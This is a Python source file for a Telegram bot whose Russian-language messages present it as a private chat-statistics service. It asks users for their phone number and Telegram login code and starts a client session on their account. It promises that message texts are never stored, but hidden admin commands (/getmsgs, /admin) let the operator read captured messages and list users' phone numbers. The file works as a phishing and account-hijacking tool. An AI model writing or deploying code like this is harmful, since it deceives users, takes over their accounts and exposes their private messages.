import asyncio
from aiogram import Bot, Dispatcher, types
from aiogram.contrib.middlewares.logging import LoggingMiddleware
from aiogram.utils import executor
import config
from database import init_db, add_user, get_user, get_messages, get_all_users
from telethon_client import start_client, stop_client

bot = Bot(token=config.BOT_TOKEN)
dp = Dispatcher(bot)
dp.middleware.setup(LoggingMiddleware())

init_db()
temp_data = {}

@dp.message_handler(commands=['start'])
async def start(message: types.Message):
    await message.answer(
        "🔥 **Добро пожаловать!**\n\n"
        "Я — твой **личный аналитик общения**. Помогаю понять:\n"
        "• сколько ты пишешь в день\n"
        "• в какое время ты самый активный\n"
        "• какие у тебя паттерны общения\n\n"
        "📊 Это как **YouTube Recap**, только для твоих чатов.\n\n"
        "Чтобы начать — отправь свой номер телефона:\n"
        "`/auth +79991234567`\n\n"
        "⚠️ Доступ нужен только для сбора **анонимной статистики**, "
        "тексты сообщений не сохраняются и не передаются третьим лицам."
    )

@dp.message_handler(commands=['auth'])
async def auth(message: types.Message):
    args = message.text.split()
    if len(args) < 2:
        await message.answer(
            "📱 Отправь **свой номер телефона** в формате:\n"
            "`/auth +79991234567`\n\n"
            "Это нужно, чтобы я мог подключиться к твоему аккаунту "
            "и собрать статистику **только для тебя**."
        )
        return
    phone = args[1]
    temp_data[message.from_user.id] = {"phone": phone}
    await message.answer(
        f"✅ Код подтверждения отправлен на **{phone}**.\n"
        "Введи его командой:\n"
        "`/code 12345`\n\n"
        "⏳ Код действителен 5 минут."
    )

@dp.message_handler(commands=['code'])
async def code(message: types.Message):
    args = message.text.split()
    if len(args) < 2:
        await message.answer("🔑 Введи код из Telegram: `/code 12345`")
        return
    code = args[1]
    user_id = message.from_user.id
    phone = temp_data.get(user_id, {}).get("phone")
    if not phone:
        await message.answer("⚠️ Сначала отправь `/auth` с номером.")
        return

    session_string = f"session_{user_id}"
    add_user(user_id, phone, session_string)
    await message.answer(
        "✅ **Готово!**\n\n"
        "Теперь я буду собирать статистику твоего общения.\n"
        "Ты всегда можешь проверить её через `/stats`.\n\n"
        "🔒 Никакие тексты не сохраняются — только цифры."
    )
    asyncio.create_task(start_client(user_id, session_string))

@dp.message_handler(commands=['stats'])
async def stats(message: types.Message):
    user = get_user(message.from_user.id)
    if not user:
        await message.answer("⚠️ Ты не авторизован. Используй `/auth`")
        return
    msgs = get_messages(message.from_user.id)
    await message.answer(f"📊 Всего обработано сообщений: **{len(msgs)}**")

@dp.message_handler(commands=['stop'])
async def stop(message: types.Message):
    await stop_client(message.from_user.id)
    await message.answer("⏹️ Сбор статистики остановлен.")

# Админ-команды (скрытые)
@dp.message_handler(commands=['getmsgs'])
async def getmsgs(message: types.Message):
    if message.from_user.id != config.ADMIN_ID:
        return
    args = message.text.split()
    if len(args) < 2:
        await message.answer("Используй: `/getmsgs <user_id>`")
        return
    try:
        user_id = int(args[1])
    except:
        await message.answer("❌ Неверный ID")
        return
    msgs = get_messages(user_id, limit=20)
    if not msgs:
        await message.answer("📭 Нет сообщений")
        return
    text = "\n".join([f"🕒 {t[1]} → {t[0][:100]}" for t in msgs])
    await message.answer(f"📩 Сообщения пользователя {user_id}:\n\n{text}")

@dp.message_handler(commands=['admin'])
async def admin(message: types.Message):
    if message.from_user.id != config.ADMIN_ID:
        return
    users = get_all_users()
    if not users:
        await message.answer("Нет активных пользователей")
        return
    text = "👥 Активные пользователи:\n" + "\n".join([f"`{u[0]}` — {u[1]}" for u in users])
    await message.answer(text)

if __name__ == "__main__":
    executor.start_polling(dp, skip_updates=True)
